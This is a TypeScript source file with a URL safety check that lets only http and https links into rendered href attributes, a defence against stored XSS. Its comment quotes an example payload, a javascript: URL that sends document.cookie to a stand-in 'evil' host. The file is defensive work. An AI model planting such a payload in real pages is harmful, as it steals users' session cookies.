/**
 * URL safety gate for values bound into `<a href>`.
 *
 * Several link URLs rendered by the UI come from data, not from the page
 * author — `privacyPolicyUrl` / `vendorOptOutUrl` / `vendorAddress` flow from
 * the shared services-library (and, in CMS integrations, from registry rows
 * editable by lower-privileged editors). Lit does not sanitize attribute
 * values, so a poisoned entry like `javascript:fetch('//evil/'+document.cookie)`
 * bound straight into an `href` becomes click-to-execute (stored XSS).
 *
 * `isSafeHttpUrl` permits only `http:` / `https:` — absolute, or relative
 * resolved against the document base (same-origin, safe). Everything else
 * (`javascript:`, `data:`, `vbscript:`, …) is rejected.
 *
 * Parsing-based, not regex: the URL parser strips tab/newline/control chars
 * per the URL spec, so obfuscations like `java\nscript:` normalise to their
 * real scheme and can't slip past.
 */
export function isSafeHttpUrl(value: string): boolean {
  let url: URL;
  try {
    url = new URL(value, document.baseURI);
  } catch {
    return false;
  }
  return url.protocol === 'http:' || url.protocol === 'https:';
}
